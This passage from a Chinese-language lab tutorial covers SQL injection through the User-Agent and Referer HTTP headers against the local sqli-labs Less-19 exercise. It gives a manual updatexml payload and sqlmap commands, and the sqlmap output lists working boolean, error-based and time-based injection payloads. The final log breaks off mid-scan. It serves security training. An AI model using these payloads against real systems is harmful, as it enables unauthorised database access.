![HTTP user-agent injection result](https://img-blog.csdnimg.cn/2020031020001916.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
即暴露出数据库版本为5.7.26。
注意：
上述操作必须在**Firefox浏览器**下操作，因为Firefox才有**编辑重发**功能；
0x7e是16进制，表示~，是为了让给出的信息更加明显而加入的。
在user-agent后加入`' and updatexml(1,concat(0x7e,(select database()),0x7e),1) or '1' = '1`，显示如下：
![HTTP user-agent injection database](https://img-blog.csdnimg.cn/20200310200042495.gif#pic_center)
显然，探测出数据库为security。

#### 在BURPSUITE中重发

修改请求头中的user-agent并重发示例如下：
![BURPSUITE HTTP user-agent](https://img-blog.csdnimg.cn/20200312105115966.gif#pic_center)

### 3.HTTP头中的Referer注入

在Firefox测试并编辑重发，如下：
![HTTP referer injection test](https://img-blog.csdnimg.cn/20200310200142154.gif#pic_center)
存在注入点，进行测试，如下：
![HTTP referer injection test2](https://img-blog.csdnimg.cn/20200310200202176.gif#pic_center)
显然，延迟了5秒左右才得到响应。
**注意：**
如访问页面未显示referer，可能是因为phpstudy版本较高，可以更换低版本，重新搭建测试环境进行测试。

#### sqlmap安全测试

测试的3种方式：

- –forms自动搜索POST表单注入
- –data指定参数探测SQL注入
- 读取文件，referer注入把referer改成 ***** 或者在后面加上*

（1）使用`--forms`测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-19/ --forms --banner --batch
1
```

打印

```shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:27:53 /2020-03-10/

[12:27:53] [INFO] testing connection to the target URL
[12:27:55] [INFO] searching for forms
[#1] form:
POST http://127.0.0.1/sqli-labs/Less-19/
POST data: uname=&passwd=&submit=Submit
do you want to test this form? [Y/n/q]
> Y
Edit POST data [default: uname=&passwd=&submit=Submit] (Warning: blank fields detected): uname=&passwd=&submit=Submit
do you want to fill blank fields with random values? [Y/n] Y
[12:27:57] [INFO] using 'XXX\sqlmap\output\results-03102020_1227pm.csv' as the CSV results file in multiple targets mode
[12:28:00] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:28:02] [INFO] testing if the target URL content is stable
[12:28:04] [INFO] target URL content is stable
[12:28:04] [INFO] testing if POST parameter 'uname' is dynamic
[12:28:06] [WARNING] POST parameter 'uname' does not appear to be dynamic
[12:28:08] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable
[12:28:10] [INFO] testing for SQL injection on POST parameter 'uname'
[12:28:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:28:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:28:22] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:28:32] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:28:42] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:28:53] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:29:03] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[12:29:05] [INFO] testing 'Generic inline queries'
[12:29:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:29:15] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:29:23] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:29:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:29:41] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:29:52] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:30:02] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[12:30:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:30:32] [WARNING] POST parameter 'uname' does not seem to be injectable
[12:30:32] [INFO] testing if POST parameter 'passwd' is dynamic
[12:30:34] [WARNING] POST parameter 'passwd' does not appear to be dynamic
[12:30:36] [WARNING] heuristic (basic) test shows that POST parameter 'passwd' might not be injectable
[12:30:38] [INFO] testing for SQL injection on POST parameter 'passwd'
[12:30:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:30:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:30:51] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:31:01] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:31:11] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:31:21] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:31:31] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[12:31:33] [INFO] testing 'Generic inline queries'
[12:31:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:31:44] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:31:52] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:32:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:32:10] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:32:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:32:30] [INFO] testing 'Oracle AND time-based blind'
[12:32:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:33:01] [WARNING] POST parameter 'passwd' does not seem to be injectable
[12:33:01] [INFO] testing if POST parameter 'submit' is dynamic
[12:33:03] [WARNING] POST parameter 'submit' does not appear to be dynamic
[12:33:05] [WARNING] heuristic (basic) test shows that POST parameter 'submit' might not be injectable
[12:33:07] [INFO] testing for SQL injection on POST parameter 'submit'
[12:33:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:33:17] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:33:19] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:33:29] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:33:40] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:33:50] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:34:00] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[12:34:02] [INFO] testing 'Generic inline queries'
[12:34:04] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:34:12] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:34:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:34:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:34:39] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:34:49] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:34:59] [INFO] testing 'Oracle AND time-based blind'
[12:35:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:35:29] [WARNING] POST parameter 'submit' does not seem to be injectable
[12:35:29] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next form
[12:35:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'XXX\sqlmap\output\results-03102020_1227pm.csv'

[*] ending @ 12:35:29 /2020-03-10/


12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394
```

此时，未发现注入点。
（2）使用`--data`进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-19/ --data="uname=admin&passwd=admin" --banner --batch
1
```

打印

```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:38:46 /2020-03-10/

[12:38:46] [INFO] testing connection to the target URL
[12:38:50] [INFO] testing if the target URL content is stable
[12:38:55] [INFO] target URL content is stable
[12:38:55] [INFO] testing if POST parameter 'uname' is dynamic
[12:38:57] [INFO] POST parameter 'uname' appears to be dynamic
[12:38:59] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable
[12:39:01] [INFO] testing for SQL injection on POST parameter 'uname'
[12:39:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:39:21] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:39:25] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:39:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:39:45] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:39:56] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:40:06] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[12:40:08] [INFO] testing 'Generic inline queries'
[12:40:10] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:40:18] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:40:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:40:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:40:44] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:40:55] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:41:05] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[12:41:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:41:25] [WARNING] POST parameter 'uname' does not seem to be injectable
[12:41:25] [INFO] testing if POST parameter 'passwd' is dynamic
[12:41:27] [INFO] POST parameter 'passwd' appears to be dynamic
[12:41:29] [WARNING] heuristic (basic) test shows that POST parameter 'passwd' might not be injectable
[12:41:31] [INFO] testing for SQL injection on POST parameter 'passwd'
[12:41:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:41:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:41:55] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:42:06] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:42:16] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:42:26] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:42:36] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[12:42:38] [INFO] testing 'Generic inline queries'
[12:42:40] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:42:48] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:42:56] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:43:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:43:15] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:43:25] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:43:35] [INFO] testing 'Oracle AND time-based blind'
[12:43:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:43:55] [WARNING] POST parameter 'passwd' does not seem to be injectable
[12:43:55] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 12:43:55 /2020-03-10/


1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162
```

显然还是未发现注入点，可以增加风险等级，也可以通过文件指定注入点进行探测。
(3)文件中标注*测试：

先建立并保存文件如下：
![sqlmap referer test](https://img-blog.csdnimg.cn/20200310200605211.gif#pic_center)
用*指定了注入点。
再用该文件测试：

```shell
python sqlmap.py -r XXXX\target.txt --banner --batch --level 3 --dbms mysql
1
```

打印

```shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:18:18 /2020-03-10/

[13:18:18] [INFO] parsing HTTP request from 'XXXX\target.txt'
custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[13:18:18] [INFO] testing connection to the target URL
[13:18:20] [INFO] testing if the target URL content is stable
[13:18:23] [INFO] target URL content is stable
[13:18:23] [INFO] testing if (custom) HEADER parameter 'Referer #1*' is dynamic
[13:18:25] [WARNING] (custom) HEADER parameter 'Referer #1*' does not appear to be dynamic
[13:18:27] [INFO] heuristic (basic) test shows that (custom) HEADER parameter 'Referer #1*' might be injectable (possible DBMS: 'MySQL')
[13:18:29] [INFO] heuristic (XSS) test shows that (custom) HEADER parameter 'Referer #1*' might be vulnerable to cross-site scripting (XSS) attacks
[13:18:29] [INFO] testing for SQL injection on (custom) HEADER parameter 'Referer #1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:18:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:18:31] [WARNING] reflective value(s) found and filtering out
[13:18:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:18:53] [INFO] testing 'Generic inline queries'
[13:18:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:20:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:21:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[13:23:01] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[13:23:52] [INFO] (custom) HEADER parameter 'Referer #1*' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="not")
[13:23:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:23:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:23:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:23:58] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:24:00] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:24:02] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:24:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:24:06] [INFO] (custom) HEADER parameter 'Referer #1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[13:24:06] [INFO] testing 'MySQL inline queries'
[13:24:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:24:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:24:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:24:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:24:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[13:24:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[13:24:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:24:37] [INFO] (custom) HEADER parameter 'Referer #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[13:24:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:24:37] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:25:19] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[13:26:02] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[13:26:47] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[13:27:27] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[13:28:08] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[13:28:49] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[13:29:29] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[13:30:10] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[13:30:51] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[13:31:31] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
(custom) HEADER parameter 'Referer #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 400 HTTP(s) requests:
---
Parameter: Referer #1* ((custom) HEADER)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://127.0.0.1/sqli-labs/Less-19/' RLIKE (SELECT (CASE WHEN (1118=1118) THEN 0x687474703a2f2f3132372e302e302e312f73716c692d6c6162732f4c6573732d31392f ELSE 0x28 END)) AND 'dFqT'='dFqT

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://127.0.0.1/sqli-labs/Less-19/' AND (SELECT 8908 FROM(SELECT COUNT(*),CONCAT(0x7162767071,(SELECT (ELT(8908=8908,1))),0x71706a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'XYkp'='XYkp

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://127.0.0.1/sqli-labs/Less-19/' AND (SELECT 1215 FROM (SELECT(SLEEP(5)))FoGI) AND 'SBOH'='SBOH
---
[13:32:12] [INFO] the back-end DBMS is MySQL
[13:32:12] [INFO] fetching banner
[13:32:22] [INFO] retrieved: '5.5.53'
[13:32:33] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.5.53'
[13:32:33] [INFO] fetched data logged to text files under 'XXX\sqlmap\output\127.0.0.1'

[*] ending @ 13:32:33 /2020-03-10/


1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889
```

显然，此时探测到注入点，说明post参数请求不存在注入点。
也可以将Referer设为*，即

> …
> Sec-Fetch-Mode: navigate
> Sec-Fetch-User: ?1
> Referer: *
> Accept-Encoding: gzip, deflate, br
> Accept-Language: zh-CN,zh;q=0.9
> …

再次进行测试，打印：

```shell
         ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:54:22 /2020-03-10/

[18:54:22] [INFO] parsing HTTP request from 'XXXX\target.txt'
[18:54:22] [INFO] found a total of 2 targets
URL 1:
GET http://127.0.0.1:80/sqli-labs/Less-19/
Cookie: csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF
do you want to test this URL? [Y/n/q]
> Y
[18:54:23] [INFO] testing URL 'http://127.0.0.1:80/sqli-labs/Less-19/'
[18:54:23] [WARNING] detected empty POST body
custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[18:54:23] [INFO] using 'XXX\sqlmap\output\results-03102020_0654pm.csv' as the CSV results file in multiple targets mode
[18:54:23] [INFO] testing connection to the target URL
[18:54:25] [INFO] testing if the target URL content is stable
[18:54:27] [INFO] target URL content is stable
[18:54:27] [INFO] testing if (custom) HEADER parameter 'Referer #1*' is dynamic
[18:54:29] [WARNING] (custom) HEADER parameter 'Referer #1*' does not appear to be dynamic
[18:54:31] [WARNING] heuristic (basic) test shows that (custom) HEADER parameter 'Referer #1*' might not be injectable
[18:54:33] [INFO] testing for SQL injection on (custom) HEADER parameter 'Referer #1*'
[18:54:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:55:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:55:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:56:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:56:02] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:56:04] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:56:07] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:56:09] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:56:11] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:56:53] [INFO] testing 'Generic inline queries'
[18:56:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:57:18] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:58:00] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:58:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:58:47] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:58:51] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:58:51] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:59:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:00:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[19:00:59] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:01:42] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[19:02:24] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[19:02:26] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[19:02:28] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[19:02:33] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[19:02:37] [INFO] testing 'MySQL inline queries'
[19:02:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[19:03:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[19:03:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[19:04:06] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:04:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[19:05:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[19:05:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[19:06:16] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[19:06:59] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[19:07:41] [INFO] testing 'MySQL AND time-based blind (ELT)'
[19:08:24] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[19:08:26] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[19:08:28] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[19:08:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:09:57] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:11:22] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[19:12:47] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[19:14:13] [WARNING] (custom) HEADER parameter 'Referer #1*' does not seem to be injectable
[19:14:13] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next URL
URL 2:
GET http://127.0.0.1/sqli-labs/Less-19/
Cookie: csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF
do you want to test this URL? [Y/n/q]
> Y
'19:14:13] [INFO] testing URL 'http://127.0.0.1/sqli-labs/Less-19/
[19:14:13] [WARNING] detected empty POST body
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[19:14:13] [INFO] testing connection to the target URL
[19:14:15] [INFO] testing if the target URL content is stable
[19:14:17] [INFO] target URL content is stable
[19:14:17] [INFO] ignoring Cookie parameter 'csrftoken'
[19:14:17] [INFO] testing if parameter 'User-Agent' is dynamic
[19:14:19] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[19:14:21] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[19:14:23] [INFO] testing for SQL injection on parameter 'User-Agent'
[19:14:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:15:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:15:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:15:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:15:52] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:15:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:15:57] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:15:59] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:16:01] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:16:43] [INFO] testing 'Generic inline queries'
[19:16:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:17:08] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:17:50] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:18:33] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[19:18:37] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[19:18:41] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[19:18:41] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:19:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
